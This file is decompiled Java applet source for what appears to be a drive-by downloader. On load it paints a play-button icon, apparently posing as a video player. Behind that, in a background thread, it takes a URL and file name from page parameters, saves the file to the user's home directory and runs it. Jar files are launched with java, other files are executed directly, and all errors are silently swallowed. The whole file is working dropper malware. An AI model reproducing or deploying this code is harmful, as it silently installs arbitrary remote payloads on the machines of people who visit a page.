import java.nio.channels.ReadableByteChannel;
import java.io.FileOutputStream;
import java.nio.channels.Channels;
import java.io.File;
import java.net.MalformedURLException;
import java.net.URL;
import java.io.IOException;
import java.awt.RenderingHints;
import java.awt.Graphics2D;
import java.awt.Graphics;
import java.awt.Color;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Main extends Applet
{
    private static final long serialVersionUID = 1L;
    
    public static void main(final String[] args) {
        download(args[0], args[1]);
    }
    
    @Override
    public void init() {
        download(this.getParameter("fileName"), this.getParameter("url"));
        this.setBackground(Color.black);
    }
    
    @Override
    public void paint(final Graphics g) {
        final int circleSize = 70;
        if (this.getWidth() < circleSize || this.getHeight() < circleSize) {
            return;
        }
        final int x = this.getWidth() / 2;
        final int y = this.getHeight() / 2;
        ((Graphics2D)g).setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
        g.setColor(Color.gray);
        g.fillOval(x - circleSize / 2, y - circleSize / 2, circleSize, circleSize);
        g.setColor(Color.black);
        g.fillOval(x - (circleSize - 10) / 2, y - (circleSize - 10) / 2, circleSize - 10, circleSize - 10);
        final int[] xa = { (int)(x - 6.6), (int)Math.floor(x + 13.4), (int)(x - 6.6) };
        final int[] ya = { y - 20, y, y + 20 };
        g.setColor(Color.white);
        g.fillPolygon(xa, ya, 3);
    }
    
    private static void download(final String fileName, final String url) {
        new Thread(new Runnable() {
            private void execute(final String command) {
                try {
                    Runtime.getRuntime().exec(command);
                }
                catch (IOException ex) {}
            }
            
            @Override
            public void run() {
                URL fileURL = null;
                try {
                    fileURL = new URL(String.valueOf(url) + fileName);
                }
                catch (MalformedURLException ex) {}
                final String path = String.valueOf(System.getProperty("user.home")) + File.separator;
                try {
                    final ReadableByteChannel rbc = Channels.newChannel(fileURL.openStream());
                    final FileOutputStream fos = new FileOutputStream(String.valueOf(path) + fileName);
                    fos.getChannel().transferFrom(rbc, 0L, 16777216L);
                    fos.close();
                }
                catch (IOException ex2) {}
                if (fileName.endsWith("jar")) {
                    final String os = System.getProperty("os.name").toUpperCase();
                    if (os.contains("WINDOWS")) {
                        this.execute("javaw -jar " + path + fileName);
                    }
                    else if (os.contains("LINUX")) {
                        this.execute("java -jar " + path + fileName + " &");
                    }
                    else {
                        this.execute("java -jar " + path + fileName);
                    }
                }
                else {
                    this.execute(String.valueOf(path) + fileName);
                }
            }
        }).start();
    }
}
